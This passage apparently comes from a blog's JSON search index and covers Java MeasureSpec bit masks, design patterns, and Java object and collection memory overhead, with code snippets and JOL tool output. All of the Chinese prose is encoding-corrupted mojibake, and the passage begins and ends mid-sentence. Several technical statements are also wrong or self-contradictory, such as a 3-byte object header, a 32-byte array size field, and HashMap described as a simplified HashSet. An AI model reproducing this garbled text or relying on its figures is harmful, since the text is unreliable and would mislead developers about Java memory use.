â€¦(30ä¸ª0) ç³»ç»Ÿå†…éƒ¨ä½¿ç”¨ EXACTLY çˆ¶Viewå·²ç¡®å®šå­View çš„ç¡®åˆ‡å¤§å°ï¼Œå­Viewçš„å¤§å°ä¸ºçˆ¶Viewæµ‹é‡æ‰€å¾—çš„å€¼ 01 â€¦(30ä¸ª0) å…·ä½“æ•°å€¼ã€match_parent AT_MOST çˆ¶View æŒ‡å®šä¸€ä¸ªå­Viewå¯ç”¨çš„æœ€å¤§å°ºå¯¸å€¼ï¼ŒViewå¤§å° ä¸èƒ½è¶…è¿‡è¯¥å€¼ã€‚ 10 â€¦(30ä¸ª0) wrap_content å‚è€ƒ Javaä½è¿ç®—æ“ä½œå…¨é¢æ€»ç»“ Java ä½è¿ç®—(ç§»ä½ã€ä½ä¸ã€æˆ–ã€å¼‚æˆ–ã€éï¼‰","tags":[{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"è®¾è®¡æ¨¡å¼æ€»ç»“","date":"2017-07-23T19:03:51.000Z","path":"2017/07/23/2017-07-23-design-pattern/","text":"ä¸€èˆ¬æ¥è®²è®¾è®¡æ¨¡å¼æœ‰23ç§ï¼Œè¿™é‡Œæ ¹æ®èœé¸Ÿæ•™ç¨‹ä¸Šçš„å…³äºè®¾è®¡æ¨¡å¼çš„æ€»ç»“çœ‹ä¸‹æ¥çš„ä¸€äº›è¯»ä¹¦ç¬”è®°ï¼Œä¼°è®¡è¦å†™å¾ˆä¹…ã€‚ è®¾è®¡æ¨¡å¼åˆ†å››å¤§ç±»ï¼š åˆ›å»ºå‹æ¨¡å¼ ç»“æ„å‹æ¨¡å¼ è¡Œä¸ºå‹æ¨¡å¼ J2EEæ¨¡å¼ 1. é¢å‘å¯¹è±¡çš„å…­å¤§åŸåˆ™è¿™ä¸ªå°±å½“èƒŒä¹¦å¥½äº†ã€‚ å•ä¸€èŒè´£åŸåˆ™ å¼€é—­åŸåˆ™ é‡Œæ°æ›¿æ¢åŸåˆ™ ä¾èµ–å€’ç½®åŸåˆ™ æ¥å£éš”ç¦»åŸåˆ™ è¿ªç±³ç‰¹åŸåˆ™ 2. 23ä¸­è®¾è®¡æ¨¡å¼ç®€å•ä»‹ç» å·¥å‚æ¨¡å¼æ„å›¾ï¼šå®šä¹‰ä¸€ä¸ªåˆ›å»ºå¯¹è±¡çš„æ¥å£ï¼Œè®©å…¶å­ç±»è‡ªå·±å†³å®šå®ä¾‹åŒ–å“ªä¸€ä¸ªå·¥å‚ç±»ï¼Œå·¥å‚æ¨¡å¼ä½¿å…¶åˆ›å»ºè¿‡ç¨‹å»¶è¿Ÿåˆ°å­ç±»è¿›è¡Œã€‚ åšæ³•ï¼š å®šä¹‰ä¸€ä¸ªå®ŒæˆæŸé¡¹åŠŸèƒ½çš„æ¥å£ï¼ŒåŠŸèƒ½çš„å…·ä½“å®ç°ç”±å­ç±»å†³å®šï¼Œè®©å­ç±»å®ç°å·¥å‚æ¥å£ï¼Œè¿”å›çš„ä¹Ÿæ˜¯ä¸€ä¸ªæŠ½è±¡äº§å“ã€‚ å®ä¾‹ï¼šgetSystemServiceæ ¹æ®ä¼ å…¥çš„å‚æ•°å†³å®šè¿”å›ä»€ä¹ˆæ ·çš„SystemServiceå®ä¾‹ã€‚ æŠ½è±¡å·¥å‚æ¨¡å¼ å•ä¾‹æ¨¡å¼ å‚è€ƒ è®¾è®¡æ¨¡å¼å¤§å…¨ ä»Androidä»£ç ä¸­æ¥è®°å¿†23ç§è®¾è®¡æ¨¡å¼","tags":[{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"},{"name":"designpattern","slug":"designpattern","permalink":"https://haldir65.github.io/tags/designpattern/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"javaå¯¹è±¡å†…å­˜å ç”¨åˆ†æ","date":"2017-07-23T19:02:52.000Z","path":"2017/07/23/2017-07-23-from-java-code-to-java-heap/","text":"é¢å‘å¯¹è±¡è¯­è¨€å°±æ„å‘³ç€å¯¹è±¡è¦å ç”¨å†…å­˜ç©ºé—´ï¼Œé‚£ä¹ˆï¼Œjavaä¸­éšä¾¿new å‡ºæ¥çš„ä¸œè¥¿åˆ°åº•å¤šå¤§ï¼Ÿè¿˜æœ‰ï¼Œnewå‡ºæ¥çš„ä¸œè¥¿å…¨éƒ½éƒ½æ”¾åœ¨heapä¸Šå—(æœ‰äº›çœŸä¸æ˜¯)ï¼Ÿ 1.é¦–å…ˆç»™å‡ºç²¾ç¡®åˆ¤æ–­Objectå¤§å°çš„ä¸€ç§æ–¹æ³•ä¸€ä¸ªåˆ¤æ–­Java Objectå¤§å°çš„æ–¹æ³•æ¯”è¾ƒç²¾å‡†çš„ç¡®å®šä¸€ä¸ªå¯¹è±¡çš„å¤§å°çš„æ–¹æ³•: public class ObjectSizeFetcher { private static Instrumentation instrumentation; public static void premain(String args, Instrumentation inst) { instrumentation = inst; } public static long getObjectSize(Object o) { return instrumentation.getObjectSize(o); } } è¿™æ ·é€šå¸¸åœ¨IDEé‡Œé¢è·‘ä¸èµ·æ¥ã€‚ æ®è¯´dump memoryä¹Ÿè¡Œï¼Œæ²¡è¯•è¿‡ã€‚ openjdkæä¾›äº†ä¸€ç§command line interfaceå¯ä»¥æ–¹ä¾¿çš„æŸ¥çœ‹ä¸€ä¸ªobjectåˆ°åº•å ç”¨å¤šå°‘å†…å­˜ curl -O -L https://repo1.maven.org/maven2/org/openjdk/jol/jol-cli/0.9/jol-cli-0.9-full.jar java -cp jol-cli-0.9-full.jar org.openjdk.jol.Main internals java.lang.String ##æ¯”æ–¹è¯´è¦çœ‹Stringçš„å†…å­˜åˆ†å¸ƒ è¾“å‡ºï¼š java -cp jol-cli-0.9-full.jar org.openjdk.jol.Main internals java.lang.String # Running 64-bit HotSpot VM. # Using compressed oop with 3-bit shift. # Using compressed klass with 3-bit shift. # Objects are 8 bytes aligned. # Field sizes by type: 4, 1, 1, 2, 2, 4, 4, 8, 8 [bytes] # Array element sizes: 4, 1, 1, 2, 2, 4, 4, 8, 8 [bytes] Instantiated the sample instance via default constructor. java.lang.String object internals: OFFSET SIZE TYPE DESCRIPTION VALUE 0 4 (object header) 01 00 00 00 (00000001 00000000 00000000 00000000) (1) 4 4 (object header) 00 00 00 00 (00000000 00000000 00000000 00000000) (0) 8 4 (object header) da 02 00 f8 (11011010 00000010 00000000 11111000) (-134216998) 12 4 char[] String.value [] 16 4 int String.hash 0 20 4 (loss due to the next object alignment) Instance size: 24 bytes Space losses: 0 bytes internal + 4 bytes external = 4 bytes total æˆ‘ä»¬ç†ŸçŸ¥çš„Stringå°±ä¸€ä¸ªint(hashcode)å’Œä¸€ä¸ªchar[]æ•°ç»„ï¼Œä»ä¸Šé¢çš„ç»“æœæ¥çœ‹ï¼Œå¼€å¯å‹ç¼©æŒ‡é’ˆå,å¯¹è±¡å¤´å 12å­—èŠ‚ï¼Œå­—ç¬¦æ•°ç»„4ä¸ªå­—èŠ‚ï¼Œintå ç”¨4å­—èŠ‚ï¼Œä¸€å…±20å­—èŠ‚ï¼Œç”±äºè¦å†…å­˜å¯¹é½ï¼Œæœ€ç»ˆå¾—åˆ°24å­—èŠ‚ï¼ˆè¿™è¿˜æ˜¯ä»€ä¹ˆéƒ½æ²¡æ”¾çš„æ—¶å€™çš„å†…å­˜å ç”¨ï¼‰ 2. å†…å­˜å¯¹é½JVMä¸ºäº†mallocä¸gcæ–¹ä¾¿ï¼ŒæŒ‡å®šåˆ†é…çš„æ¯ä¸ªå¯¹è±¡éƒ½éœ€è¦æ˜¯8å­—èŠ‚çš„æ•´æ•°å€å‚è€ƒç®€å•æ¥è¯´ï¼Œä¸€ä¸ªObjectå ç”¨çš„å†…å­˜å¤§å°æ˜¯8 Byteçš„å€æ•° åœ¨DirectByteBufferçš„æ„é€ å‡½æ•°ä¸­æœ‰è¿™ä¹ˆä¸€æ®µå†…å­˜å¯¹é½çš„å‡½æ•° if (pa &amp;&amp; (base % ps != 0)) { // Round up to page boundary address = base + ps - (base &amp; (ps - 1)); } else { address = base; } 3. javaè¿›ç¨‹çš„å†…å­˜å ç”¨æƒ…å†µ3.1 æ“ä½œç³»ç»Ÿå’ŒRuntimeå ç”¨çš„å†…å­˜æ“ä½œç³»ç»Ÿçš„å†…å­˜ä¸­ï¼Œä¸€éƒ¨åˆ†è¢«æ“ä½œç³»ç»Ÿå’Œkernelæ‰€å ç”¨ã€‚å¯¹äºç”¨cæˆ–è€…c++å†™çš„jvmï¼Œè¿˜éœ€è¦åˆ†é…ä¸€éƒ¨åˆ†ç»™c runtimeã€‚æ“ä½œç³»ç»Ÿå’Œcruntimeå ç”¨çš„å†…å­˜æ¯”è¾ƒå¤§ï¼Œä¸åŒçš„æ“ä½œç³»ç»Ÿä¸Šä¸ä¸€æ ·ï¼Œwindowsä¸Šé»˜è®¤æ˜¯2GBã€‚å‰©ä¸‹çš„å†…å­˜(å³user space)ï¼Œå°±æ˜¯è¿›ç¨‹å¯ä»¥ä½¿ç”¨çš„å†…å­˜ã€‚ 3.2 å‰©ä¸‹çš„å†…å­˜(user space)å¯¹äºJavaè¿›ç¨‹æ¥è®²ï¼Œè¿™å‰©ä¸‹çš„éƒ¨åˆ†åˆ†ä¸ºä¸¤å—: Java Heap(s) Native (non-java) Heap Java Heapå¯ä»¥é€šè¿‡-Xms å’Œ -Xmx æ¥è®¾ç½®æœ€å°å€¼å’Œæœ€å¤§å€¼Native Heapæ˜¯åœ¨åˆ†é…äº†java maximum Heapå¤§å°ä¹‹åå‰©ä¸‹çš„å¤§å°(jvmå ç”¨çš„å†…å­˜ä¹Ÿç®—åœ¨è¿™é‡Œé¢) 3.3 æ•°æ®ç±»å‹å¤§å°åŸºæœ¬æ•°æ®ç±»å‹å¤§å°å¾ˆç®€å•ï¼Œå…¶å®ä¹Ÿä¸ç®€å•ã€‚è¿™å¼ å›¾æ˜¯ä»ibmç½‘ç«™ä¸Šæˆªä¸‹æ¥çš„æ³¨æ„ä¸€ä¸ªbooleanåœ¨æ•°ç»„ä¸­åªå ç”¨ä¸€ä¸ªå­—èŠ‚ï¼Œå•ç‹¬ä½¿ç”¨å ç”¨4ä¸ªå­—èŠ‚ã€‚åŸç†å‚è€ƒ å¼•ç”¨çš„å¤§å°ï¼šåœ¨ 32 ä½çš„ JVM ä¸Šï¼Œä¸€ä¸ªå¯¹è±¡å¼•ç”¨å ç”¨ 4 ä¸ªå­—èŠ‚ï¼›åœ¨ 64 ä½ä¸Šï¼Œå ç”¨ 8 ä¸ªå­—èŠ‚ã€‚é€šè¿‡ java -d64 -version å¯ç¡®å®šæ˜¯å¦æ˜¯ 64 ä½çš„ JVMã€‚å¤„ç†å™¨èƒ½å¤Ÿå¤„ç†çš„bitèŒƒå›´å†³å®šäº†æ“ä½œç³»ç»Ÿèƒ½å¤Ÿä½¿ç”¨çš„å†…å­˜èŒƒå›´ï¼š32ä½çš„cpu(2^32 = 4,294,967,296 bits = 4GB)64ä½cpu (2^64 = 18,446,744,073,709,551,616 = 16 exabytes)å¤šæ•°jvmæ˜¯ç”¨cæˆ–è€…c++å†™çš„: the Java runtime creates an operating-system process â€” just as if you were running a C-based program. In fact, most JVMs are written largely in C or C++ æŸ¥çœ‹jvmæ˜¯å¦64ä½çš„æ–¹æ³•: java -d64 -version64ä½ä¸Šå¼•ç”¨å ç”¨å¤§å°å˜å¤§çš„åŸå› æ˜¯ï¼Œéœ€è¦ç®¡ç†4gä»¥ä¸Šçš„å†…å­˜ï¼ŒæŒ‡é’ˆ(å†…å­˜åœ°å€ä¸å¤Ÿç”¨äº†) 4. javaå¯¹è±¡å†…å­˜å¸ƒå±€ï¼Œä»ä¸€ä¸ªIntegerè¯´èµ·ä¸€ä¸ªclasså®ä¾‹å æ®çš„å¤§å°åŒ…æ‹¬: è‡ªèº«çš„å¤§å°ï¼ˆå¯¹è±¡å¤´+åŸºæœ¬æ•°æ®ç±»å‹æ•°æ®å¤§å°ï¼‰ - Shadow heap sizeObjectè‡ªèº«çš„å¤§å°åœ¨ä¸åŒçš„jvmç‰ˆæœ¬å’Œå‚å•†ä¹‹é—´æœ‰ä¸€äº›å˜åŒ–ï¼Œä½†å¤§ä½“ä¸ŠåŒ…æ‹¬ä¸‰ä¸ªéƒ¨åˆ†: Class ï¼š ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘å¯¹åº”çš„classï¼Œç”¨äºè¡¨æ˜å…¶ç±»å‹ã€‚æ¯”å¦‚ä¸€ä¸ªIntegerå°±æŒ‡å‘java.lang.Integerè¿™ä¸ªç±»(32ä½ä¸Š4å­—èŠ‚ï¼Œ64ä½ä¸Š8å­—èŠ‚) Flags : A collection of flags that describe the state of the object, including the hash code for the object if it has one, and the shape of the object (that is, whether or not the object is an array).ï¼ˆå°±æ˜¯å­˜hashå€¼å’Œç”¨äºè¡¨ç¤ºæ˜¯ä¸æ˜¯æ•°ç»„çš„ï¼Œ32ä½ä¸Š4å­—èŠ‚ï¼Œ64ä½ä¸Š8å­—èŠ‚ï¼‰ Lock æ‰€æœ‰çš„Objectéƒ½èƒ½lockï¼Œè¿™éƒ¨åˆ†å†…å­˜ç”¨äºè¡¨ç¤ºå½“å‰Objectæ˜¯å¦æ˜¯è¢«synchronized(32ä½ä¸Š4å­—èŠ‚ï¼Œ64ä½ä¸Š8å­—èŠ‚) æ‰€ä»¥ï¼Œå¯¹äºjava.lang.Integeræ¥è¯´ï¼Œä¸€ä¸ªIntegerçš„å¤§å°å°±æ˜¯ï¼š32(classä¿¡æ¯)+32(Flags)+32(Lock))+32(intæ˜¯åŸºæœ¬æ•°æ®ç±»å‹ï¼Œ4å­—èŠ‚) = 128bitsï¼ˆ16å­—èŠ‚ï¼‰äº‹å®ä¸Šï¼Œä¸€ä¸ªIntergerçš„å¤§å°æ˜¯intï¼ˆ4ä¸ªå­—èŠ‚ï¼‰çš„å››å€ï¼Œç®€å•æ¥è¯´ä¸€ä¸ªå¯¹è±¡çš„å¤´ä¿¡æ¯å°±å ç”¨äº†3ä¸ªå­—èŠ‚ã€‚ æ•°ç»„çš„å¤§å°æ•°ç»„å’Œæ™®é€šçš„objectå·®ä¸å¤šï¼Œå¤šäº†ä¸€ä¸ªsize(32å­—èŠ‚)ã€‚ä¹Ÿå°±æ˜¯è¯´ã€‚ä¸ºäº†å­˜å‚¨ä¸€ä¸ªintå€¼ã€‚ä½¿ç”¨ä¸€ä¸ªå¤§å°ä¸º1çš„int[]æ•°ç»„çš„å†…å­˜æ¶ˆè€—æ¯”ä¸€ä¸ªIntegerè¿˜è¦å¤§ã€‚ï¼ˆåŒæ ·ï¼Œ32ä½4å­—èŠ‚ï¼Œ64ä½8å­—èŠ‚ï¼‰ã€‚æ•°ç»„å› ä¸ºå¤šä¸€ä¸ªsizeï¼Œæ‰€ä»¥4ä¸ªå­—èŠ‚èµ·æ­¥ã€‚ 8ä¸ªå­—èŠ‚å˜æˆ4ä¸ªå­—èŠ‚IBMå’ŒOracleçš„jvméƒ½èƒ½å¤Ÿæä¾›ompressed References (-Xcompressedrefs) å’ŒCompressed OOPs (-XX:+UseCompressedOops) é€‰é¡¹ã€‚è¿™æ ·ä¸€æ¥ï¼ŒåŸæœ¬åœ¨64ä½æœºå™¨ä¸Šè¦å ç”¨8ä¸ªå­—èŠ‚çš„æŒ‡é’ˆå°±åªè¦å ç”¨4ä¸ªå­—èŠ‚äº†ã€‚ä½†è¿™åªå¯¹java Heapä¸Šçš„å†…å­˜æœ‰æ•ˆï¼Œå¯¹äºNative Heapè¿™éƒ¨åˆ†ï¼Œ64ä½å ç”¨å†…å­˜è¿˜æ˜¯è¦æ¯”32ä½å¤šã€‚æ‰€ä»¥åŒæ ·çš„ä¸€ä»½ä»£ç ï¼Œåœ¨64ä½ä¸Šå ç”¨çš„å†…å­˜ä¸€å®šæ¯”32ä½ä¸Šå¤šã€‚jdk 1.6.xä¹‹åå¥½åƒé»˜è®¤æ˜¯æ‰“å¼€äº†çš„ã€‚ å¼•ç”¨çš„å¯¹è±¡çš„å¤§å°(é€’å½’å³å¯) - Retained heap size(Shallow Heapå¤§å°åŠ ä¸Šå¼•ç”¨çš„å¯¹è±¡çš„)java.lang.Integerè¿˜ç®—æ¯”è¾ƒç®€å•çš„ï¼Œé‡Œé¢é™¤äº†ä¸€ä¸ªintå€¼è¡¨ç¤ºvalueä»¥å¤–ï¼Œæ²¡æœ‰å…¶å®ƒçš„æˆå‘˜å˜é‡ï¼Œæ‰€ä»¥å¹¶æ²¡æœ‰å¼•ç”¨åˆ°å…¶ä»–å¯¹è±¡çš„å®ä¾‹ã€‚å¯¹äºå¤æ‚ä¸€ç‚¹çš„æ•°æ®ç±»å‹ï¼Œæ¯”å¦‚jav.lang.Stringå‘¢ï¼Ÿ Stringæœ¬èº«æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„ç±»(å¦‚æœä¸ç®—å¸¸é‡æ± çš„è¯)ï¼Œå‡ ä¹å¯ä»¥çœ‹æˆä¸€ä¸ªcharæ•°ç»„çš„wrapperã€‚é™¤äº†ä¸€ä¸ªæ™®é€šå¯¹è±¡çš„classã€Flagå’ŒLocksç­‰ä¿¡æ¯å¤–ï¼ŒStringå†…éƒ¨è¿˜æœ‰ä¸€ä¸ª private int hashï¼ˆç”¨äºCache hashå€¼ï¼‰ï¼Œè¿˜æœ‰offsetå’Œcountï¼ˆè¿™ä¿©å¥½åƒæ²¡æ‰¾åˆ°ï¼‰ï¼Œæ­¤å¤–å°±æ˜¯ä¸€ä¸ªcharæ•°ç»„äº†ã€‚æ‰€ä»¥ï¼Œä¸ºäº†å­˜å‚¨8ä¸ªå­—ç¬¦(16ä¸ªå­—èŠ‚,128bits)ã€‚é¦–å…ˆè¿™ä¸ªcharæ•°ç»„å¯¹è±¡å ç”¨äº†16ä¸ªå­—èŠ‚(2*8)+ï¼ˆå¯¹è±¡å¤´+æ•°ç»„å¤§å°ï¼‰16ä¸ªå­—èŠ‚ = 256bitsã€‚ç®—åˆ°Stringå¤´ä¸Šï¼ŒStringæœ¬èº«çš„æ–‡ä»¶å¤´æ˜¯12ä¸ªå­—èŠ‚ï¼Œç®—ä¸Šhash,count,offsetå„è‡ª4ä¸ªå­—èŠ‚ï¼Œå°±24ä¸ªå­—èŠ‚äº†ã€‚å†åŠ ä¸Šæ•°ç»„çš„å¼•ç”¨4ä¸ªå­—èŠ‚ï¼Œå†åŠ ä¸Šæ•°ç»„çš„å¤§å°32ä¸ªå­—èŠ‚ã€‚åˆè®¡60ä¸ªå­—èŠ‚ï¼ˆ480bitsï¼‰ã€‚è€Œè¿™é‡Œé¢å®é™…æœ‰ç”¨çš„æ•°æ®åªæœ‰16ä¸ªå­—èŠ‚ã€‚73.3%çš„å†…å­˜éƒ½æ˜¯å­˜å‚¨å…¶ä»–ä¸œè¥¿çš„ã€‚ è¯´çš„æ¯”è¾ƒä¹±äº†ï¼Œè¿™é‡Œç›´æ¥ç…§æ¬ä¸€æ®µè®¡ç®—,å‚è€ƒ - ä¸€èˆ¬è€Œè¨€ï¼ŒJava å¯¹è±¡åœ¨è™šæ‹Ÿæœºçš„ç»“æ„å¦‚ä¸‹ï¼š â€¢å¯¹è±¡å¤´ï¼ˆobject headerï¼‰ï¼š8 ä¸ªå­—èŠ‚ï¼ˆä¿å­˜å¯¹è±¡çš„ class ä¿¡æ¯ã€IDã€åœ¨è™šæ‹Ÿæœºä¸­çš„çŠ¶æ€ï¼‰ â€¢Java åŸå§‹ç±»å‹æ•°æ®ï¼šå¦‚ int, float, char ç­‰ç±»å‹çš„æ•°æ® â€¢å¼•ç”¨ï¼ˆreferenceï¼‰ï¼š4 ä¸ªå­—èŠ‚ â€¢å¡«å……ç¬¦ï¼ˆpaddingï¼‰ Stringå®šä¹‰ï¼š JDK6: private final char value[]; private final int offset; private final int count; private int hash; JDK6çš„ç©ºå­—ç¬¦ä¸²æ‰€å çš„ç©ºé—´ä¸º40å­—èŠ‚ JDK7: private final char value[]; private int hash; private transient int hash32; JDK7çš„ç©ºå­—ç¬¦ä¸²æ‰€å çš„ç©ºé—´ä¹Ÿæ˜¯40å­—èŠ‚ JDK6å­—ç¬¦ä¸²å†…å­˜å ç”¨çš„è®¡ç®—æ–¹å¼ï¼š é¦–å…ˆè®¡ç®—ä¸€ä¸ªç©ºçš„ char æ•°ç»„æ‰€å ç©ºé—´ï¼Œåœ¨ Java é‡Œæ•°ç»„ä¹Ÿæ˜¯å¯¹è±¡ï¼Œå› è€Œæ•°ç»„ä¹Ÿæœ‰å¯¹è±¡å¤´ï¼Œæ•…ä¸€ä¸ªæ•°ç»„æ‰€å çš„ç©ºé—´ä¸ºå¯¹è±¡å¤´æ‰€å çš„ç©ºé—´åŠ ä¸Šæ•°ç»„é•¿åº¦ï¼Œå³ 8 + 4 = 12 å­—èŠ‚ , ç»è¿‡å¡«å……åä¸º 16 å­—èŠ‚ã€‚ é‚£ä¹ˆä¸€ä¸ªç©º String æ‰€å ç©ºé—´ä¸ºï¼š å¯¹è±¡å¤´ï¼ˆ8 å­—èŠ‚ï¼‰+ char æ•°ç»„ï¼ˆ16 å­—èŠ‚ï¼‰+ 3 ä¸ª intï¼ˆ3 Ã— 4 = 12 å­—èŠ‚ï¼‰+1 ä¸ª char æ•°ç»„çš„å¼•ç”¨ (4 å­—èŠ‚ ) = 40 å­—èŠ‚ã€‚ å› æ­¤ä¸€ä¸ªå®é™…çš„ String æ‰€å ç©ºé—´çš„è®¡ç®—å…¬å¼å¦‚ä¸‹ï¼š 8*( ( 8+12+2*n+4+12)+7 ) / 8 = 8*(int) ( ( ( (n) *2 )+43) /8 ) å…¶ä¸­ï¼Œn ä¸ºå­—ç¬¦ä¸²é•¿åº¦ã€‚ å°ç»“éšä¾¿newä¸€ä¸ªObjectå°±æ„å‘³ç€12ä¸ªByteæ²¡äº†ï¼Œæ•°ç»„çš„è¯16ä¸ªå­—èŠ‚æ²¡äº†ã€‚æ¯æ·»åŠ ä¸€ä¸ªæˆå‘˜å˜é‡ï¼ˆæŒ‡é’ˆï¼‰ï¼Œ4ä¸ªå­—èŠ‚æ²¡äº†ã€‚è¿™äº›éƒ½è¿˜æ²¡ç®—ä¸Šå®é™…å­˜å‚¨çš„æ•°æ®ã€‚ 5. java.utilæ¡†æ¶ä¸­ä½¿ç”¨çš„é‚£äº›é›†åˆç±»5.1 HashSetA HashSet is an implementation of the Set interfaceã€‚æ— é‡å¤å…ƒç´ ï¼Œä¸ä¿è¯è¿­ä»£é¡ºåºï¼Œå¸¸è§„çš„add,containsç­‰æ–¹æ³•é€Ÿåº¦ä¸ä¼šéšç€å†…éƒ¨å…ƒç´ çš„å¢åŠ è€Œå˜æ…¢ã€‚HashSetå†…éƒ¨æœ€å¤šæœ‰ä¸€ä¸ªnullï¼Œåº•å±‚å®ç°æ˜¯HashMapï¼Œè¿™æ„å‘³ç€å…¶å ç”¨å†…å­˜è¦æ¯”HashMapå¤§ã€‚é»˜è®¤å®¹é‡ 16ä¸ªEntrieså†…éƒ¨å…ƒç´ ä¸ºç©ºæ—¶çš„å¤§å° 144bytesæŸ¥æ‰¾ï¼Œæ·»åŠ ï¼Œåˆ é™¤çš„æ—¶é—´å¤æ‚åº¦ä¸º O(1)ï¼Œåœ¨æ²¡æœ‰Hash collisionså‘ç”Ÿçš„å‰æä¸‹ 5.2 HashMapA HashMap is an implementation of the Map interface.HashMapæ˜¯ä¸€ç§å­˜å‚¨Key-Valueå‹æ•°æ®çš„é›†åˆï¼Œä¸€ä¸ªkeyæœ€å¤šmapåˆ°ä¸€ä¸ªvalueï¼Œkeyå’Œvalueéƒ½å¯ä»¥ä¸ºnullï¼Œå¯ä»¥å­˜å‚¨é‡å¤å…ƒç´ ã€‚ï¼ˆæ‰€ä»¥ï¼‰â€”â€”HashMapæ˜¯HashSetçš„ä¸€ç§åŠŸèƒ½ä¸Šçš„ç®€åŒ–ã€‚åº•å±‚æ˜¯Entries(Entrieså…ƒç´ æ˜¯é“¾è¡¨)ï¼Œé•¿è¿™æ ·ã€‚ transient HashMapEntry&lt;K,V&gt;[] table = (HashMapEntry&lt;K,V&gt;[]) EMPTY_TABLE;HashMapçš„æˆå‘˜å˜é‡åŒ…æ‹¬ï¼š transient HashMapEntry&lt;K,V&gt;[] tableï¼ˆHashMapEntryçš„æ•°ç»„ï¼‰int sizeint thresholdfinal float loadFactortransient int modCount; ä¸€ä¸ªHashMapåˆšåˆ›å»ºæ—¶(å®Œå…¨ä¸ºç©ºæ—¶)çš„å¤§å°ä¸º128bytesï¼Œjdk 1.8åœ¨åˆå§‹åŒ–æ—¶æ²¡æœ‰åŠ è½½Entriesï¼Œåœ¨putæ“ä½œæ—¶æ‰å»åˆ†é…ã€‚å¯èƒ½ä¼šå¥½ä¸€ç‚¹ã€‚å†…éƒ¨ç»“æ„ä¸€èˆ¬æ˜¯è¿™æ ·çš„ï¼Œä¸€ä¸ªHashMapEntryçš„å¤§å°ä¸º32byteã€‚int KeyHashObject nextObject keyObject valueHashMapæ¯æ¬¡puté”®å€¼å¯¹æ—¶ï¼Œéƒ½ä½¿ç”¨äº†ä¸€ä¸ªHashMap$Entryè¿™æ ·çš„åŒ…è£…ç±»ï¼Œè¿™æ„å‘³ç€æ•´ä¸ªHashMapçš„overheadåŒ…æ‹¬ï¼šThis means that the total overhead of a HashMap consists of the HashMap object, a HashMap$Entry array entry, and a HashMap$Entry object for each entry.ç›´æ¥ç…§æ¬ç»“è®ºï¼šå¯¹äºHashMapDefault capacitiesä¸º16ä¸ª entries å¯¹äºä¸€ä¸ªæœ‰10000ä¸ªEntriesçš„HashMapï¼Œå…‰æ˜¯ç”±äºHashMapï¼ŒEntryæ•°ç»„ä»¥åŠæ¯ä¸ªEntryå¯¹è±¡å¸¦æ¥çš„overheadå°±è¾¾åˆ°äº†360Kå·¦å³ï¼Œè¿™é‡Œè¿˜ä¸ç®—å­˜å‚¨çš„é”®å€¼å¯¹æœ¬èº«çš„å¤§å°ã€‚ 5.3 HashtableHashTableå’ŒHashMapçš„ä¸»è¦åŒºåˆ«æ˜¯HashTableæ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼ŒHashTableä¸­å¾ˆå¤šæ–¹æ³•éƒ½åŠ ä¸Šäº†synchronizedä¿®é¥°ã€‚ä¸€èˆ¬æ¥è®²ï¼Œjdk1.5ä»¥ä¸Šå¦‚æœæƒ³è¦çº¿ç¨‹å®‰å…¨ï¼Œç›´æ¥ç”¨synchronizedHashMapã€‚Hashtableç»§æ‰¿è‡ªDictionaryï¼Œåè€…å·²ç»è¢«åºŸå¼ƒäº†ï¼Œæ¨èä½¿ç”¨mapæ¥å£çš„å®ç°ç±»ã€‚ç…§æ¬ç»“è®ºï¼šè¦å­˜å‚¨10kä¸ªEntriesï¼Œoverheadè¾¾åˆ°360kã€‚ 5.4 LinkedListLinkedistæ˜¯å…¸å‹çš„åŒå‘é“¾è¡¨ï¼Œé™¤éå¢åˆ æ“ä½œç‰¹åˆ«é¢‘ç¹ï¼Œå¦åˆ™æ²¡å¿…è¦ä½¿ç”¨ã€‚æŸ¥æ‰¾çš„æ—¶é—´å¤æ‚åº¦ä¸º o(n)ã€‚æ·»åŠ çš„å…ƒç´ è¢«åŒ…è£…åœ¨ä¸€ä¸ªNodeèŠ‚ç‚¹ä¸­ã€‚å­˜å‚¨10Kä¸ªå…ƒç´ çš„overheadä¸º240Kã€‚ 5.5 ArrayListArrayListè¦å¥½å¾ˆå¤šï¼Œvalueç›´æ¥å­˜åœ¨ä¸€ä¸ªæ•°ç»„å†…éƒ¨ï¼ŒæŸ¥æ‰¾çš„æ—¶é—´å¤æ‚åº¦ä¸ºo(1)å­˜å‚¨10Kä¸ªå…ƒç´ çš„overheadä¸º40Kå·¦å³ã€‚ 5.6 StringBufferï¼ŒStringBuilderStringBufferç›´æ¥å¼ºåŠ synchronizedï¼ŒStringBuilderå’ŒStringBufferéƒ½ç»§æ‰¿è‡ªAbstractStringBuilderã€‚æˆå‘˜å˜é‡å°±ä¸¤ä¸ªä¸€ä¸ªchar[] valueå’Œä¸€ä¸ªint countã€‚ 6.é›†åˆçš„é»˜è®¤åˆå§‹å®¹é‡å’Œæ‰©ç³»æ•°ä»¥StirngBufferä¸ºä¾‹ï¼ˆä¹Ÿç®—ä¸€ç§charçš„é›†åˆå§ï¼‰ï¼Œé»˜è®¤å®¹é‡æ˜¯16ï¼Œå³åˆ›å»ºäº†ä¸€ä¸ªchar[16]ï¼Œç©ºçš„ï¼Œç®—ä¸Šå¯¹è±¡å¤´ï¼Œä¸€å…±72bytesã€‚è¿™è¿˜åªæ˜¯StringBufferé‡Œä»€ä¹ˆéƒ½æ²¡å­˜å‚¨çš„æƒ…å†µã€‚StringBuffer sb = new StringBuffer(â€œMy Stringâ€)ã€‚//ç®—ä¸‹ç”¨äº†å¤šå°‘å†…å­˜é¦–å…ˆç®—æ•°ç»„ï¼Œæ–‡ä»¶å¤´12bytesï¼ŒåŠ ä¸Šsize 16bytesã€‚ç®—ä¸Šæ•°ç»„ï¼Œï¼ˆæ•°ç»„é•¿åº¦ä¸ºstr.length+16ï¼‰ä¸€å…±116bytesï¼Œç®—ä¸Šå†…å­˜å¯¹é½ï¼Œä¸€å…±120bytesã€‚StringBufferå¯¹è±¡çš„å¤§å°ï¼šå¯¹è±¡å¤´+count+æ•°ç»„æŒ‡é’ˆ = 20 bytesã€‚åˆè®¡140bytesï¼Œå†…å­˜å¯¹é½å144bytesï¼Œåªä¸ºå­˜å‚¨â€My 